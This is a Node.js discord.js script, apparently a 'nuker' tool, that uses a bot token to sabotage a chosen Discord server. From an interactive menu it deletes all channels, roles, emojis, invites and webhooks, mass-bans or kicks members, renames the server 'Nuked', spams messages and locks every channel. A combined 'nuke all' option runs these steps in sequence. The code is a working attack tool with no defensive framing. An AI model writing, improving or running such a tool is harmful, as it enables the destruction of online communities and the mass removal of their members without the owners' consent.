const { Client, Intents } = require('discord.js');
const fs = require('fs');
const cliProgress = require('cli-progress');
const readline = require('readline');
const path = require('path');

const logFilePath = `nuke.log`;
const logStream = fs.createWriteStream(logFilePath, { flags: 'a' });

const WHITELIST = [
    '00000000000'
];

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const tokenFile = 'token.txt';
let token = '';

if (fs.existsSync(tokenFile)) {
    token = fs.readFileSync(tokenFile, 'utf-8').trim();
    console.log("Using saved token from token.txt.");
} else {
    rl.question("Please enter your bot token: ", (input) => {
        token = input.trim();
        fs.writeFileSync(tokenFile, token);
        console.log("Token saved to token.txt.");
        rl.close();
        runBot();
    });
}

if (token) {
    runBot();
}

async function runBot() {
    const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MEMBERS, Intents.FLAGS.GUILD_MESSAGES] });

    client.once('ready', () => {
        console.log(`Logged in as ${client.user.tag}`);
        rl.question("Enter the target server ID: ", async (serverId) => {
            const guild = client.guilds.cache.get(serverId);
            if (guild) {
                console.log(`Connected to the server: ${guild.name}`);
                showOptions(guild);
            } else {
                console.log("Server not found.");
            }
        });
    });

    client.login(token);
}

function log(message) {
    console.log(message);
    logStream.write(`${new Date().toISOString()} - ${message}\n`);
}

async function showOptions(guild) {
    console.log("\nOptions:\n1. Nuke all (without kicking members)\n2. Delete channels\n3. Delete roles\n4. Ban members\n5. Kick members\n6. Delete emojis\n7. Delete server\n8. Delete invites\n9. Delete webhooks\n10. Spam message\n11. Lockdown channels");
    rl.question("Enter nuke option number (1-11): ", async (option) => {
        switch (option) {
            case '1':
                await nukeAll(guild);
                break;
            case '2':
                await deleteChannels(guild);
                break;
            case '3':
                await deleteRoles(guild);
                break;
            case '4':
                await banMembers(guild);
                break;
            case '5':
                await kickMembers(guild);
                break;
            case '6':
                await deleteEmojis(guild);
                break;
            case '7':
                await deleteServer(guild);
                break;
            case '8':
                await deleteInvites(guild);
                break;
            case '9':
                await deleteWebhooks(guild);
                break;
            case '10':
                await spamMessage(guild);
                break;
            case '11':
                await lockdownChannels(guild);
                break;
            default:
                console.log("Invalid option!");
                break;
        }
        rl.close();
    });
}

async function deleteChannels(guild) {
    const channels = guild.channels.cache;
    const bar = new cliProgress.SingleBar({}, cliProgress.Presets.shades_classic);
    bar.start(channels.size, 0);
    let count = 0;

    for (const channel of channels.values()) {
        try {
            await channel.delete();
            log(`Deleted channel: ${channel.name}`);
        } catch (error) {
            log(`Failed to delete channel: ${channel.name}`);
        }
        count++;
        bar.update(count);
    }

    bar.stop();
}

async function deleteRoles(guild) {
    const botRole = guild.me.roles.highest;
    const roles = guild.roles.cache.filter(role => role.id !== guild.id && role.id !== botRole.id);
    const bar = new cliProgress.SingleBar({}, cliProgress.Presets.shades_classic);
    bar.start(roles.size, 0);
    let count = 0;

    for (const role of roles.values()) {
        try {
            await role.delete();
            log(`Deleted role: ${role.name}`);
        } catch (error) {
            log(`Failed to delete role: ${role.name}`);
        }
        count++;
        bar.update(count);
    }

    bar.stop();
}

async function banMembers(guild) {
    const members = guild.members.cache.filter(member => !member.user.bot && !WHITELIST.includes(member.id));
    const bar = new cliProgress.SingleBar({}, cliProgress.Presets.shades_classic);
    bar.start(members.size, 0);
    let count = 0;

    for (const member of members.values()) {
        try {
            await member.ban({ reason: 'Nuke Operation' });
            log(`Banned member: ${member.user.tag}`);
        } catch (error) {
            log(`Failed to ban member: ${member.user.tag}`);
        }
        count++;
        bar.update(count);
    }

    bar.stop();
}

async function kickMembers(guild) {
    const members = guild.members.cache.filter(member => !member.user.bot && !WHITELIST.includes(member.id));
    const bar = new cliProgress.SingleBar({}, cliProgress.Presets.shades_classic);
    bar.start(members.size, 0);
    let count = 0;

    for (const member of members.values()) {
        try {
            await member.kick('Nuke Operation');
            log(`Kicked member: ${member.user.tag}`);
        } catch (error) {
            log(`Failed to kick member: ${member.user.tag}`);
        }
        count++;
        bar.update(count);
    }

    bar.stop();
}

async function deleteEmojis(guild) {
    const emojis = guild.emojis.cache;
    const bar = new cliProgress.SingleBar({}, cliProgress.Presets.shades_classic);
    bar.start(emojis.size, 0);
    let count = 0;

    for (const emoji of emojis.values()) {
        try {
            await emoji.delete();
            log(`Deleted emoji: ${emoji.name}`);
        } catch (error) {
            log(`Failed to delete emoji: ${emoji.name}`);
        }
        count++;
        bar.update(count);
    }

    bar.stop();
}

async function deleteServer(guild) {
    try {
        await guild.setName("Nuked");
        log("Server name changed to 'Nuked'");
    } catch (error) {
        log("Failed to change server name.");
    }
}

async function deleteInvites(guild) {
    const invites = await guild.invites.fetch();
    const bar = new cliProgress.SingleBar({}, cliProgress.Presets.shades_classic);
    bar.start(invites.size, 0);
    let count = 0;

    for (const invite of invites.values()) {
        try {
            await invite.delete();
            log(`Deleted invite: ${invite.code}`);
        } catch (error) {
            log(`Failed to delete invite: ${invite.code}`);
        }
        count++;
        bar.update(count);
    }

    bar.stop();
}

async function deleteWebhooks(guild) {
    const webhooks = await guild.fetchWebhooks();
    const bar = new cliProgress.SingleBar({}, cliProgress.Presets.shades_classic);
    bar.start(webhooks.size, 0);
    let count = 0;

    for (const webhook of webhooks.values()) {
        try {
            await webhook.delete();
            log(`Deleted webhook: ${webhook.name}`);
        } catch (error) {
            log(`Failed to delete webhook: ${webhook.name}`);
        }
        count++;
        bar.update(count);
    }

    bar.stop();
}

async function spamMessage(guild) {
    try {
        const channel = await guild.channels.create('nuked-by-bot', { type: 'GUILD_TEXT' });
        log(`Created spam channel: ${channel.name}`);

        for (let i = 0; i < 10; i++) {
            await channel.send("This server has been nuked!");
        }
        log("Spam message sent 10 times.");
    } catch (error) {
        log("Failed to send spam messages.");
    }
}

async function lockdownChannels(guild) {
    const channels = guild.channels.cache;
    const bar = new cliProgress.SingleBar({}, cliProgress.Presets.shades_classic);
    bar.start(channels.size, 0);
    let count = 0;

    for (const channel of channels.values()) {
        try {
            await channel.permissionOverwrites.create(guild.roles.everyone, { SEND_MESSAGES: false, ADD_REACTIONS: false });
            log(`Locked down channel: ${channel.name}`);
        } catch (error) {
            log(`Failed to lock down channel: ${channel.name}`);
        }
        count++;
        bar.update(count);
    }

    bar.stop();
}

async function nukeAll(guild) {
    await deleteRoles(guild);
    await deleteChannels(guild);
    await banMembers(guild);
    await deleteEmojis(guild);
    await deleteServer(guild);
    await deleteInvites(guild);
    await deleteWebhooks(guild);
    await spamMessage(guild);
    await lockdownChannels(guild);
}
